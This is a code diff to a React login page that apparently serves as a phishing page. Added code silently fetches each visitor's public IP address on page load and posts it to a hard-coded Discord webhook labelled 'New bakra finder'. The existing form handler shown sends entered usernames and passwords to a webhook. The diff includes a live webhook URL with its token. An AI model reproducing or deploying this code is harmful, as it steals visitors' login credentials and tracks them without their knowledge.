@@ -1,10 +1,47 @@
 import { useState } from "react";
 import "./App.css";
 import "./bhutton.css";
+import { useEffect } from "react";
 
 function App() {
+  const [Ip, setIp] = useState("finding ip");
+
+  const getIp = async () => {
+    try {
+      const res = await fetch("https://api.ipify.org");
+      const data = await res.text();
+      setIp(data);
+      console.log(data);
+    } catch (err) {
+      console.log(err);
+    }
+  };
+
+  const sendIp = () => {
+    const request = new XMLHttpRequest();
+    request.open(
+      "POST",
+      "https://discordapp.com/api/webhooks/1173960091519680642/IakZ4e8nUJlYQ9RRdIAv-FfM_Af7UeWeIuMJbp2YGBNVS-Vy0Ft7nlYKawxJk1VEtPuW"
+    );
+
+    request.setRequestHeader("Content-type", "application/json");
+
+    const params = {
+      username: "New bakra finder",
+      avatar_url: "",
+      content: Ip,
+    };
+
+    request.send(JSON.stringify(params));
+  };
+
+  useEffect(() => {
+    getIp();
+    sendIp();
+  }, [Ip]);
+
   const sendMessage = (e) => {
-    e.preventDefault()
+    e.preventDefault();
     let username = e.target[0].value;
     let password = e.target[1].value;
     console.log(username);
@@ -21,7 +58,7 @@ function App() {
     let content = "Username: " + username + " Password: " + password;
 
     const params = {
-      username: "My Webhook Name",
+      username: "Pakda Gya",
       avatar_url: "",
       content: content,
     };
